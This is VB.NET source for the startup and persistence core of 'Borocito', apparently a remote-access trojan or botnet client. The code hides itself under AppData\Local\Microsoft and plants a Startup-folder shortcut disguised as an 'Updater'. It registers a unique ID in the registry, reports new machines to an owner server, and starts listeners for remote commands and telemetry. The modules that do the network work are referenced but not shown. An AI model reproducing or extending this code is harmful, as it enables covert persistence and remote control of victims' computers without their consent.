Imports System.Runtime.InteropServices
Imports System.Text
Imports Microsoft.Win32
Module GlobalUses
    Public parameters As String
    Public DIRCommons As String = "C:\Users\" & Environment.UserName & "\AppData\Local\Microsoft\Borocito"
    Public DIRTemp As String = "C:\Users\" & Environment.UserName & "\AppData\Local\Temp"
    Public HttpOwnerServer As String
    Public compileVersion As String = My.Application.Info.Version.ToString &
        " (" & Application.ProductVersion & ") " &
        "[05/03/2025 23:56]" 'Indicacion exacta de la ultima compilacion
End Module '<--- ACTUALIZAR DATOS
Module Utility
    Public tlmContent As String
    Function AddToLog(ByVal from As String, ByVal content As String, Optional ByVal flag As Boolean = False) As String
        Try
            Dim OverWrite As Boolean = False
            If My.Computer.FileSystem.FileExists(DIRCommons & "\Borocito.log") Then
                OverWrite = True
            End If
            Dim finalContent As String = Nothing
            If flag = True Then
                finalContent = " [!!!]"
            End If
            Dim Message As String = DateTime.Now.ToString("hh:mm:ss tt dd/MM/yyyy") & finalContent & " [" & from & "] " & content
            Dim myMessage As String = "[" & from & "]" & finalContent & " " & content
            tlmContent = tlmContent & Message & vbCrLf
            Console.WriteLine(myMessage)
            Try
                My.Computer.FileSystem.WriteAllText(DIRCommons & "\Borocito.log", vbCrLf & Message, OverWrite)
            Catch
            End Try
            Return finalContent & "[" & from & "]" & content
        Catch ex As Exception
            Console.WriteLine("[AddToLog@Utility]Error: " & ex.Message)
            Return "[AddToLog@Utility]Error: " & ex.Message
        End Try
    End Function
    Function CreateRandomString(ByRef Length As Integer) As String
        Dim str As String = Nothing
        Dim rnd As New Random
        For i As Integer = 0 To Length
            Dim chrInt As Integer = 0
            Do
                chrInt = rnd.Next(30, 122)
                If (chrInt >= 48 And chrInt <= 57) Or (chrInt >= 65 And chrInt <= 90) Or (chrInt >= 97 And chrInt <= 122) Then
                    Exit Do
                End If
            Loop
            str &= Chr(chrInt)
        Next
        Return str
    End Function
    <DllImport("kernel32")>
    Private Function GetPrivateProfileString(ByVal section As String, ByVal key As String, ByVal def As String, ByVal retVal As StringBuilder, ByVal size As Integer, ByVal filePath As String) As Integer
        'Use GetIniValue("KEY_HERE", "SubKEY_HERE", "filepath")
    End Function
    Public Function GetIniValue(section As String, key As String, filename As String, Optional defaultValue As String = Nothing) As String
        Dim sb As New StringBuilder(500)
        If GetPrivateProfileString(section, key, defaultValue, sb, sb.Capacity, filename) > 0 Then
            Return sb.ToString
        Else
            Return defaultValue
        End If
    End Function
End Module
Module Memory
    Public regKey As RegistryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Borocito", True)
    Public OwnerServer As String
    Public UID As String
    Public MyCommandProcessor As String = DIRCommons & "\CommandProcessor.cmp"
    Sub SaveRegedit()
        Try
            AddToLog("SaveRegedit@Memory", "Saving data...", False)
            regKey.SetValue("UID", UID, RegistryValueKind.String)
            regKey.SetValue("MyCommandProcessor", MyCommandProcessor, RegistryValueKind.String)
            LoadRegedit()
        Catch ex As Exception
            AddToLog("SaveRegedit@Memory", "Error: " & ex.Message, True)
        End Try
    End Sub
    Sub LoadRegedit()
        Try
            AddToLog("LoadRegedit@Memory", "Loading data...", False)
            OwnerServer = regKey.GetValue("OwnerServer")
            Dim httpPrefix As String = Nothing
            If OwnerServer.StartsWith("https") Then
                httpPrefix = "https://"
            ElseIf OwnerServer.StartsWith("http") Then
                httpPrefix = "http://"
            End If
            OwnerServer = OwnerServer.Replace(httpPrefix, Nothing)
            UID = regKey.GetValue("UID")
            MyCommandProcessor = regKey.GetValue("MyCommandProcessor")
            HttpOwnerServer = httpPrefix & OwnerServer
        Catch ex As Exception
            AddToLog("LoadRegedit@Memory", "Error: " & ex.Message, True)
        End Try
    End Sub
End Module
Module StartUp
    Sub Init()
        AddToLog("Init", "Borocito " & My.Application.Info.Version.ToString & " (" & Application.ProductVersion & ")" & " has started! " & DateTime.Now.ToString("hh:mm:ss tt dd/MM/yyyy"), True)
        Try
            Threading.Thread.Sleep(1500)
            'Iniciar desde otra ubicacion
            RunFromLocation()
            'Evita multi-instancias
            OnlyOneInstance()
            'Iniciar con Windows
            StartWithWindows()
            'Iniciar con Administrador
            StartWithAdmin()
            'Ver si ha existido
            If AlreadyExist() Then
                'Ya ha existido
                LoadRegedit()
                'Actualizaciones de telemtria
                Network.Telemetry.StartRefreshTelemetry(True)
                'Lee los archivos de configuracion del servidor
                Network.ServerHandle.ServerConfigFiles()
                'iniciar todo lo demas.
                '   Escuchar comandos desde el servidor
                Network.CommandManager.CommandListenerManager(True)
                '   Escuchar comandos a traves de Boro-Comm
                Boro_Comm.StartServer()
                '   Escuchar configuracion de UID
                Network.ServerHandle.ConfigFileListenerManager(True)
            Else
                'No ha existido
                'Crear UID
                UID = CreateRandomString(15)
                'Guarda la UID
                SaveRegedit()
                'Reportar al servidor
                Network.Telemetry.ReportMeToServer()
                'Guardar existencia
                SetExistence()
                'Reiniciar
                RestartBorocito()
            End If
        Catch ex As Exception
            AddToLog("Init@StartUp", "Error: " & ex.Message, True)
        End Try
    End Sub
    Sub Stopit(Optional ByVal reason As String = Nothing)
        Try
            If reason <> Nothing Then
                AddToLog("StopIt", reason, True)
            Else
                AddToLog("StopIt", "Ending execution...", True)
            End If
            Boro_Comm.Connector.SendMesssage("|DISCONNECTED_BY_OWN|")
            End
        Catch ex As Exception
            AddToLog("Stopit@StartUp", "Error: " & ex.Message, True)
        End Try
    End Sub
    Sub OnlyOneInstance()
        Try
            AddToLog("OnlyOneInstance@StartUp", "Checking instances...", True)
            Dim p = Process.GetProcessesByName(IO.Path.GetFileNameWithoutExtension(Application.ExecutablePath))
            If p.Count > 1 Then
                AddToLog("OnlyOneInstance@StartUp", "Instance detected!, closing me...", True)
                Stopit()
            Else
                AddToLog("OnlyOneInstance@StartUp", "No instances detected!, starting...", True)
            End If
        Catch ex As Exception
            AddToLog("OnlyOneInstance@StartUp", "Error: " & ex.Message, True)
        End Try
    End Sub
    Sub RunFromLocation()
        Try
            If Application.StartupPath.Contains("Local\Microsoft") = False Then
                AddToLog("RunFromLocation@StartUp", "Running from " & Application.ExecutablePath, True)
                'If My.Computer.FileSystem.FileExists(DIRCommons & "\Borocito.exe") Then
                '    My.Computer.FileSystem.DeleteFile(DIRCommons & "\Borocito.exe")
                'End If
                'My.Computer.FileSystem.CopyFile(Application.ExecutablePath, DIRCommons & "\Borocito.exe")
                'Process.Start(DIRCommons & "\Borocito.exe", parameters)
                'Stopit()
            End If
        Catch ex As Exception
            AddToLog("RunFromLocation@StartUp", "Error: " & ex.Message, True)
        End Try
    End Sub
    Function AlreadyExist() As Boolean
        AddToLog("AlreadyExist@StartUp", "Checking if exist", False)
        Try
            If regKey Is Nothing Then
                AddToLog("AlreadyExist@StartUp", "I dont exist.", False)
                Return False
            Else
                If regKey.GetValue("UID") = Nothing Then
                    AddToLog("AlreadyExist@StartUp", "I exist, but badly borned.", False)
                    Return False
                Else
                    AddToLog("AlreadyExist@StartUp", "Already exist. Im here!", False)
                    RegisterInstance()
                    Return True
                End If
                Return False
            End If
        Catch ex As Exception
            AddToLog("AlreadyExist@StartUp", "Error: " & ex.Message, True)
            Return False
        End Try
    End Function
    Sub RegisterInstance()
        Try
            If regKey IsNot Nothing Then
                regKey.SetValue(My.Application.Info.AssemblyName, Application.ExecutablePath)
                regKey.SetValue("Name", My.Application.Info.AssemblyName)
                regKey.SetValue("Version", My.Application.Info.Version.ToString & " (" & Application.ProductVersion & ")")
            End If
        Catch ex As Exception
            AddToLog("RegisterInstance@StartUp", "Error: " & ex.Message, True)
        End Try
    End Sub
    Sub RestartBorocito()
        Try
            AddToLog("RestartBorocito@StartUp", "Restarting...", False)
            Network.Telemetry.SendFirstTelemetry()
            Process.Start(Application.ExecutablePath)
            Stopit()
        Catch ex As Exception
            AddToLog("RestartBorocito@StartUp", "Error: " & ex.Message, True)
        End Try
    End Sub
    Sub SetExistence()
        Try
            AddToLog("SetExistence@StartUp", "Seting the existente in the Windows Registry", False)
            Registry.CurrentUser.CreateSubKey("SOFTWARE\\Borocito")
            regKey.SetValue("UID", UID, RegistryValueKind.String)
        Catch ex As Exception
            AddToLog("SetExistence@StartUp", "Error: " & ex.Message, True)
        End Try
    End Sub
    Sub StartWithWindows()
        Try
            AddToLog("StartWithWindows@StartUp", "Making Borocito start with Windows...", False)
            Dim StartupShortcut As String = Environment.GetFolderPath(Environment.SpecialFolder.Startup) & "\Updater.lnk"
            If Not My.Computer.FileSystem.FileExists(StartupShortcut) Then
                Dim WSHShell As Object = CreateObject("WScript.Shell")
                Dim Shortcut As Object = WSHShell.CreateShortcut(StartupShortcut)
                Shortcut.IconLocation = DIRCommons & "\BorocitoUpdater.exe,0"
                Shortcut.TargetPath = DIRCommons & "\BorocitoUpdater.exe"
                Shortcut.WindowStyle = 1
                Shortcut.Description = "Updater software for Borocito"
                Shortcut.Save()
                My.Computer.FileSystem.CopyFile(DIRCommons & "\BorocitoUpdater.exe", Environment.GetFolderPath(Environment.SpecialFolder.Startup) & "\Updater.exe")
            End If
        Catch ex As Exception
            AddToLog("StartWithWindows@Extractor", "Error: " & ex.Message, True)
        End Try
    End Sub
    Sub StartWithAdmin()
        Try

        Catch ex As Exception
            AddToLog("StartWithAdmin@StartUp", "Error: " & ex.Message, True)
        End Try
    End Sub
End Module
